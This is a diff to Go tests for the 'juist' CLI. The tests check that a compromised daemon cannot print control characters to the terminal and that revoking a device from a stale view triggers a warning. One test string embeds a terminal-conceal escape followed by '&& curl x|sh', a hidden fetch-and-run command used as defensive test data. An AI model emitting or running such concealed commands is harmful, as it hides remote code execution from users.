@@ -118,7 +118,7 @@ func TestACompromisedJuistdPutsNoControlCharacterOrRootCommandOnTheTerminal(t *t
 		out := d.cli.mustRun(append([]string{"--socket", proxy}, args...)...)
 		if args[0] == "health" {
 			mustContain(t, out, "firewalld blocks juist0�[8m && curl x|sh", "log sync to vps�[8m",
-				"the relay cannot take 443: permission denied", "data plane refused the device set: refused")
+				"the relay cannot bind 443: permission denied", "data plane refused the device set: refused")
 		}
 		if i := strings.IndexAny(out, "\x1b\x07\u202e\u200b"); i >= 0 {
 			t.Errorf("juist %s printed a control character: %q", args[0], out[max(0, i-40):min(len(out), i+40)])
@@ -217,12 +217,12 @@ func TestARevocationOnAStaleViewIsWarnedOf(t *testing.T) {
 		}
 	}
 	out := d.cli.mustRun("--socket", hoursAgo, "revoke", "laptop", "voucher", "--yes")
-	mustContain(t, out, warning+", last vouched for 3h ago, and undoes any later change it lacks",
-		"hint: where it can wait, let this device catch up first")
+	mustContain(t, out, warning+", last vouched for 3h ago; it undoes any later change missing here",
+		"hint: if it can wait, let this device catch up first")
 
 	d.mustRun("grant", "laptop", "voucher")
 	out = d.cli.mustRun("--socket", stale(0, true), "revoke", "laptop", "voucher", "--yes")
-	mustContain(t, out, warning+", which no admin device vouches for, and undoes any later change it lacks")
+	mustContain(t, out, warning+", which no admin device vouches for; it undoes any later change missing here")
 
 	d.mustRun("grant", "laptop", "voucher")
 	if out := d.mustRun("revoke", "laptop", "voucher", "--yes"); strings.Contains(out, warning) {
